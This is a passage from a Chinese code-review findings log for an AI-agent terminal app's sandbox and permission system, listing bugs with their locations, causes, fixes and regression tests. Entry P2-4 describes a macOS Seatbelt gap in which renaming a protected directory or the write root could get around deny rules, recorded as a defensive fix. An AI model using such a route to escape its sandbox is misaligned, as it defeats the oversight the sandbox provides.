  2. 在 `Lx` 抽统一会话沙箱重置方法，接入 `new_session`、`on_session_deleted`、`set_lx_entry`（不兼容分支）、`set_ai_web_site` 与 `rewind` 删空分支。
- **回归测试**：`db::service::sandbox_tests` 覆盖双窗格同会话切档同步及 DB 写失败回滚；`app::update::tests` 覆盖 `Native <-> AiWeb` 重置。
- **状态**：已修复并锁回归

### P1-11：`db/sandbox.rs` 用 `\u{0}` 拼接存入 `prefix_json` 列并过滤空参数 token

- **位置**：`src/db/sandbox.rs:141-146, 172-177`
- **关键点**：写入使用 `tokens.join("\u{0}")`，读取使用 `.split('\u{0}').filter(|token| !token.is_empty())`。
- **错误原因**：`git commit -m ""` 解析出的空参数 token 在落库重载后会被 `filter(!is_empty)` 静默丢弃，导致会话精确规则失效，且字段名与内容格式不符。
- **修复方案**：写入标准 `serde_json::to_string(&rule.tokens)`；读取优先解析 JSON 数组，对不以 `[` 开头的历史测试/旧库数据回退 `\u{0}` 切分（不滤空串）。
- **回归测试**：`db::sandbox::tests` 验证含空串 token 的规则存取无损往返且兼容旧格式。
- **状态**：已修复并锁回归

### P1-12：上下文装配在 `kept.is_empty()` 时倾倒全部历史切换，且 `<system-update>` / `skill_blocks` 未计入预算

- **位置**：`src/chat/context/mod.rs:261-268, 288-318, 361-369, 400-402`、`src/chat/context/switches.rs:14-66`
- **关键点**：
  1. 当 `omitted_turns > 0` 但 `kept.is_empty()`（窗口紧张到所有历史轮均被裁剪）时，`min_switch_sequence` 退回 `start_after`，导致整段历史中每一条模型/权限切换的 `<system-update>` 全量灌入请求；
  2. `retained_updates`（含多路径 `<sandbox>` XML）与 `skill_blocks` 未计入 `budget`/`used` 扣减。
- **错误原因**：误将 `kept.is_empty()` 与“无历史切换被裁剪”混同，且预算计算遗漏了动态插入的 `skill_blocks` 与切换消息体积。
- **修复方案**：`omitted_turns > 0 && kept.is_empty()` 时将 `min_switch_sequence` 设为 `i64::MAX`（只留最新一条模型切换与最新一条权限切换）；将 `skill_blocks` 与 `retained_updates` token 纳入预算扣除。
- **回归测试**：`chat::context::tests::model_switch` 覆盖极窄预算下 `kept.is_empty()` 只保留末条切换与大体积切换块预算裁剪。
- **状态**：已修复并锁回归

### P1-13：设置页 `GET /api/sandbox` 损坏文件返回 422 锁死前端保存、IO 错用 422 且忽略 `state.user_root()`

- **位置**：`src/settings/service/sandbox.rs:32-43, 58-60, 67-117`、`assets/settings_sandbox.js:41-44, 88-103`
- **关键点**：损坏 `sandbox.json` 导致 `GET` 报 422 且前端 `sandboxBaseline` 为 `null` 无法保存覆写；`PUT` 把 IO 错误标成 422；`body()`/`open_rules()` 直接读宿主 `~/.lx-t` 而未优先取 `state.user_root()`。
- **错误原因**：违背 `design.md` §3.1（损坏不阻塞，回落默认+告警）及测试/隔离根规范。
- **修复方案**：`GET` 遇到解析/校验错误时记 `warn`、回落 `SandboxSettings::default()` 并附带加载告警；`PUT` 区分校验错 `422` 与 IO/HOME 错 `500`；`body`/`open_rules` 基于 `state.user_root()` 推导 `path` 与 `rules` 目录（`rules` 加载亦支持指定目录状态）。
- **回归测试**：`settings::service::sandbox::tests` 覆盖损坏文件可 `GET` 回落并 `PUT` 修复、IO 失败返回 `500`、以及隔离 `user_root` 路径正确。
- **状态**：已修复并锁回归

### P1-14：窄窗格下顶边框 `lx-<Entry> [<Mode>]` 与 `[>_]` 视图切换按钮重叠覆写

- **位置**：`src/ui/main_content/panes.rs:38-62, 94, 170-176`、`src/ui/main_content/mod.rs:49-91`
- **关键点**：`lx-Automation [Workspace]` 宽 25 列，而 `draw_toggle_button` 在 `rect.width >= 7` 即画在 `rect.right() - 5`，未对超宽左侧标题按按钮前可用列数裁切。
- **错误原因**：分屏窗格宽度 ≤ 30 列时 `[>_]` 直接覆盖 `[Workspace]`/`[Read-only]` 尾部字符。
- **修复方案**：计算顶边框按钮前最大标题宽度并先截断入口/后缀或省略超出部分，确保与 `[>_]` 之间至少保留 1 列边框间隔。
- **回归测试**：`ui::tests` 增加 `24`/`28` 列窄窗格测试，断言 `[>_]` 完整保留且左侧标题无越界覆盖。
- **状态**：已修复并锁回归

---

## P2（中危边界缺陷 / 交互与样式瑕疵）

### P2-1：`src/chat/sandbox/denial.rs:38` 在核心 `chat/` 模块中违规出现 `#[cfg(target_os = "linux")]`

- **位置**：`src/chat/sandbox/denial.rs:37-41`
- **关键点**：在 `chat/` 中直接按平台门控退出码 `128 + 31`。
- **错误原因**：违反 `AGENTS.md` 与 `code-writing-standards.md:72`（OS 专属代码只允许在 `src/platform/`）。
- **修复方案**：在 `src/platform/sandbox/mod.rs` 提供 `pub fn is_seccomp_exit_code(code: i32) -> bool` 封装平台 `#[cfg]`，`denial.rs` 调用该纯函数。
- **回归测试**：`chat::sandbox::denial::tests` 与全局 `cfg(target_os)` 检查确认 `chat/`、`app/` 零平台宏。
- **状态**：已修复并锁回归

### P2-2：`PolicyStore::append_allow_rule` 在 `default.rules` 末尾无换行时追加会破坏整文件 Starlark 语法

- **位置**：`src/chat/exec_policy/mod.rs:282-290`
- **关键点**：`append` 直接写入 `prefix_rule(...)`，未检查前文末字节是否为 `\n`。
- **错误原因**：手工编辑去掉末尾换行后追加规则会把两句粘成一行导致 Starlark 解析失败。
- **修复方案**：追加前检查文件大小与最后一个字节，非空且非 `b'\n'` 时先补 `\n`。
- **回归测试**：`chat::exec_policy::tests` 写入无尾换行 `default.rules` 后追加规则并验证重新加载成功。
- **状态**：已修复并锁回归

### P2-3：`save_sandbox` 先调 `validate()` 再调 `normalized()`，导致直接传入 `~/` 根路径失败

- **位置**：`src/config/sandbox.rs:257-260`
- **关键点**：`settings.validate()?;` 排在 `settings.clone().normalized()?;` 之前。
- **错误原因**：`validate()` 拒绝未展开的 `~/`，使调用方直接传 `~/extra` 保存时在展开前就被拒绝。
- **修复方案**：移除前置 `settings.validate()?`，先执行 `normalized()` 展开再去重校验。
- **回归测试**：`config::sandbox::tests` 传 `writable_roots: [~/extra]` 直接调用 `save_sandbox` 断言成功。
- **状态**：已修复并锁回归

### P2-4：macOS Seatbelt 缺失 `deny_globs` 祖先 unlink 保护、写根锚点 unlink 保护，且 `glob::to_regex` 遗漏 `{...}`/`**/<dir>` 后代匹配

- **位置**：`src/platform/sandbox/seatbelt.rs:35-48, 82-112`、`src/platform/sandbox/glob.rs:21-119`
- **关键点**：1) `PROTECT_ANCESTOR` 未包含 `deny_globs` 静态前缀祖先；2) 落在 `/private/tmp` 内的写根 `/private/tmp/ws` 自身未加 `file-write-unlink` 保护；3) `to_regex("/ws/{a,b}", true)` 与 `to_regex("/ws/**/.env", true)` 在目录形态下缺少 `(/.*)?` 后代拦截。
- **错误原因**：在 macOS 上可通过重命名 `/ws/sec` 或写根自身绕过规则，或直接读写匹配的 deny 目录内部文件。
- **修复方案**：为写根自身及非全局 `deny_globs` 静态祖先目录补全 `file-write-unlink` 保护；在 `glob::to_regex` 为包含 `**` 或花括号的目录模式补充 `(/.*)?` 后代匹配。
- **回归测试**：`platform::sandbox::seatbelt::tests`（macOS）与 `glob::tests` 实测重命名与目录后代拦截。
- **状态**：已修复并锁回归

### P2-5：`approval::sweep_orphans` 第二轮回扫漏检 `cancel` 标记与 `parent.pane` / `parent.generation`

- **位置**：`src/event/chat/approval.rs:350-362`
- **关键点**：首轮扫 UI 队列有完整检查，二轮扫 `streams.approvals` 遗漏 `cancels` 与 `handle.parent` 一致性校验。
- **错误原因**：UI 队列已移除但仍留在 `streams.approvals` 的已取消/旧代次子 agent 审批不会被唤醒回收。
- **修复方案**：抽共用 `is_approval_key_live` 供两轮扫描共同调用。
- **回归测试**：`event::chat::subagent::tests_sandbox` 覆盖仅 `streams.approvals` 残留且 `cancel == true` 时被 `sweep_orphans` 回收。
- **状态**：已修复并锁回归

### P2-6：多条沙箱审批排队缺少队列计数提示，且窄窗格下 `CommandPanelView` 顶栏挤掉 `[Subagent]` 与 `[role]`

- **位置**：`src/ui/main_content/lx/approval.rs:87-218`、`src/ui/widgets/command_panel.rs:494-532`、`src/ui/widgets/command_panel/context.rs:64-87`
- **关键点**：多条子 agent 审批并发入队无 `+N pending` 提示；宽度 `< 43` 列时长标题 `Sandbox rule requires approval` 挤没 `[Subagent]`，`< 29` 列时 `Subagent: Turing [executor]` 截掉 `[executor]`。
- **错误原因**：`render_top_rule` 未先为 `right_title` 预留列宽；审批未传队列余量；来源行只做尾部截断。
- **修复方案**：`right_title` 在 `approvals.len() > 1` 时展示 `+[Subagent]` / `+N pending`；`render_top_rule` 先保证 `right_title` 完整再截断左侧 `title`；`Subagent:` 行窄宽优先保留 `[role]` 并缩略昵称。
- **回归测试**：`ui::main_content::lx::tests::slash_panels` 覆盖 2 条并发排队提示与 32 列窄窗格 `[Subagent]` / `[executor]` 完整可见。
- **状态**：已修复并锁回归

### P2-7：连续 `Permission switched xN` 合并卡片展开态在中间切换被移除后可能卡死无法折叠

- **位置**：`src/ui/main_content/lx/history/snapshot/switches.rs:80, 102-113`、`src/app/state/lx/permission_switch.rs:102-117`
- **关键点**：展开判定用全区间 `is_range_expanded(slice)`，点击却写死切换 `slice[0].id`，一旦 `expanded` 里曾留有区间中后续条目 ID 将永远收不回去。
- **错误原因**：展开集合与点击目标粒度不一致（同区间可能合并进先前单独展开过的节点）。
- **修复方案**：快照/交互或 `toggle_range` 在处于展开态时清空同区间所有已展开 ID，折叠态时展开首条。
- **回归测试**：`ui::main_content::lx::history::tests::permission_switch` 覆盖区间内第 2 条预展开后再合并点击即可正常收起。
- **状态**：已修复并锁回归

### P2-8：`SettingsEvent::SandboxChanged` 未刷新已打开 `/permission` 面板；设置页缺纵向滚动且丢弃 `capabilities.reason`

- **位置**：`src/event/inventory.rs:108-111`、`assets/settings.css:13`、`assets/settings_sandbox.js:52-57`
- **关键点**：设置页改默认模式后已打开的 `/permission` 面板 `[Default]` 未热刷新；`#view-sandbox` 未加 `overflow-y: auto` 导致小屏裁切；`renderSandbox` 忽略 `capabilities.reason`。
- **错误原因**：缺少状态同步刷新及 CSS/JS 状态展示遗漏。
- **修复方案**：在 `apply_sandbox_changed` 刷新所有已打开 `SlashPanel::Permission`；`settings.css:13` 加入 `#view-sandbox`；`settings_sandbox.js` 在 `reason` 非空时通过 `textContent` 追加展示。
- **回归测试**：`app::update::chat::tests::permission` 验证 `SandboxChanged` 热刷 `[Default]`；`settings::service::tests` 校验 CSS 滚动与 `reason` 消费。
- **状态**：已修复并锁回归

### P2-9：`fork_completed_history_window_to_child` 向子 agent 会话复制无消费方的 `agent_permission_switch` 行

- **位置**：`src/db/chat/fork.rs:579-585`
- **关键点**：派生带上下文子会话时复制了父会话 `agent_permission_switch`，但子轮装配只按主会话最新模式对比 `prev_child_mode`、从不查询该表。
- **错误原因**：复制过程直接沿用了会话 `/fork` 的子集逻辑，留下死数据并占用序列号。
- **修复方案**：移除 `copy_completed_history_window_to_child` 中的 `copy_permission_switches_for_fork` 调用。
- **回归测试**：`db::sandbox::tests` 验证 `fork_context = true` 创建子会话后其 `permission_switches` 为空。
- **状态**：已修复并锁回归

### P2-10：主会话等待沙箱审批期间，`Lx::agent_state()` 未标为 `AgentState::Blocked`

- **位置**：`src/app/state/lx.rs:447`
- **关键点**：`agent_state()` 只检查 `has_pending_ask()` 与 `agents.blocked_count() > 0`，未检查 `!self.approvals.is_empty()`。
- **错误原因**：主会话被沙箱审批阻塞等待用户裁决时，侧栏 `Agents` 状态点仍显示绿色 `Working` 而非黄色 `Blocked`。
- **修复方案**：将 `!self.approvals.is_empty()` 纳入 `AgentState::Blocked` 判定条件。
- **回归测试**：`app::state::tests` 或 `app::update::chat::tests::approval` 验证审批入队后 `lx.agent_state() == AgentState::Blocked`。
- **状态**：已修复并锁回归

---

## P3（低危规范 / 预算 / 死代码 / 文档同步与超限登记）

### P3-1：系统提示词超 12 KiB 预算、文案误称 `read`/`write` 支持 glob、缺 `protected` 截断标记，及空串枚举/批准结果摘要细节

- **位置**：`src/chat/prompt.rs:49-191, 121, 418-423`、`src/chat/prompt/tests.rs:256`、`src/chat/tools/process_args.rs:246-248`、`src/chat/tools/output.rs:104-193`
- **关键点**：
  1. `LX_SYSTEM_PROMPT` 当前约 13,498 字节（`tests.rs:256` 曾放宽至 `14_000`），而项目规范 `code-writing-standards.md:23` 预算为 12 KiB（`12_288` 字节）；且第 121 行误写 `read`/`write` 支持 glob；
  2. `push_sandbox_xml` 对超过 8 条的 `protected` 未输出 `<truncated omitted="N"/>`；
  3. `"sandbox_permissions": ""` 被当 `None` 静默忽略而非报错；
  4. 显式批准结果文本缺 `approved once` / `approved for session: ...` 摘要回显。
- **修复方案**：在不删核心安全规则的前提下精简 `LX_SYSTEM_PROMPT` 冗余措辞压回 `< 12_288` 字节并恢复 12 KiB 门限；修正第 121 行仅 `deny` 支持 glob；补齐 `<truncated>`、空串拒绝与批准摘要回显。
- **回归测试**：`chat::prompt::tests`（12 KiB 预算与 `protected > 8` 截断）、`chat::tools::process_args::tests`、`chat::tools::output::tests`。
- **状态**：已修复并锁回归

### P3-2：文案未完全集中进 `ui/text/sandbox.rs`、残留死常量、过时单测名、字面反引号与注释版本号滞后

- **位置**：`src/ui/main_content/lx/approval.rs:136, 138, 147, 152, 154`、`src/app/state/lx/slash/permission.rs:13, 18, 23`、`src/app/state/lx/slash.rs:207`、`src/app/update/chat/permission_switch.rs:120-123`、`src/ui/text/sandbox.rs:48-52`、`src/app/update/chat/tests/approval.rs:1, 168-175`、`assets/web.html:222`、`src/db/sandbox.rs:1`
- **修复方案**：把上述 UI 文案全部收口进 `src/ui/text/sandbox.rs`；删除 3 个零引用旧常量；重命名 `unrelated_keys_do_not_edit_the_draft_while_pending` 并补 `assert_eq!(target.lx.input, "draft")`；`web.html:222` 改用 `<code>`；更新 `db/sandbox.rs` 注释为 v31/v32。
- **状态**：已修复并锁回归

### P3-3：文件行数超限登记（`AGENTS.md`：生产 ≤ 1000 行，测试 ≤ 1500 行）

按已确认分支协作策略（避免在旧基线 `41d5977b` 上大拆已在 `dev` 演进的历史文件以防三方合并冲突）：
- **本分支所有新建模块**均在 500 行以内（最大 `src/chat/sandbox/permissions.rs` 468 行）。
- **本分支新触及刚越过红线的文件**（`src/ui/text.rs` 当前 1018 行，较分叉点 +2 行；`assets/web.html` 当前 1019 行，较分叉点 +37 行）：优先将 `ui/text.rs` 可剥离的沙箱/相关文案与 `src/ui/tests.rs` 新增测试迁移到子模块（如 `src/ui/main_content/lx/tests/` / `ui/text/sandbox.rs`），至少保证本分支增量不推高根文件体积。
- **分叉前即超限的既有文件清单**（保留并登记在案，合入 `dev` 后统筹跟进拆解）：
  - 生产 > 1000 行：`src/event/chat/btw.rs`（1387 行，已在 `dev` 拆至 900 行）、`src/app/update/chat/mod.rs`（1135 行）、`src/app/state/lx/chat.rs`（1080 行）、`src/db/chat/mod.rs`（1077 行）、`src/app/update/chat/subagent.rs`（1047 行）、`src/ui/text.rs`（1018 行）、`assets/web.html`（1019 行）。
  - 测试 > 1500 行：`src/app/update/tests.rs`（6100 行）、`src/ui/tests.rs`（3296 行）、`src/ui/main_content/lx/tests.rs`（2396 行）、`src/settings/service/tests.rs`（1882 行）、`src/db/chat/subagent/tests.rs`（1747 行）、`src/db/tests.rs`（1671 行）、`src/app/update/chat/tests.rs`（1538 行）、`src/event/chat/tests/subagent.rs`（1504 行）。
- **状态**：已完成新增边界控制并登记历史超限清单（`src/ui/text.rs` 零新增行，既有超行文件拆解留合入 `dev` 后统筹）

### P3-4：功能与规范文档漂移同步（`design.md`、`task.md`、`verification.md`、`docs/standards/html-assets.md`）

- **位置**：`docs/feature/sandbox-permissions/{design.md,task.md,verification.md}`、`docs/standards/html-assets.md:27, 42`
- **关键点**：`task.md` 全文勾选框未更新且缺失补充交付（命令面板、左上角 `[Mode]`、v32、subagent/btw 跟随、审计日志）与本次 Review 修复任务；`design.md` 仍标草案且残留旧 strip/v31 冲突描述与落点表遗漏；`html-assets.md` 漏列 `settings_sandbox.js`。
- **修复方案**：随修复节奏同步更新上述文档至完全一致状态。
- **状态**：已修复并锁回归
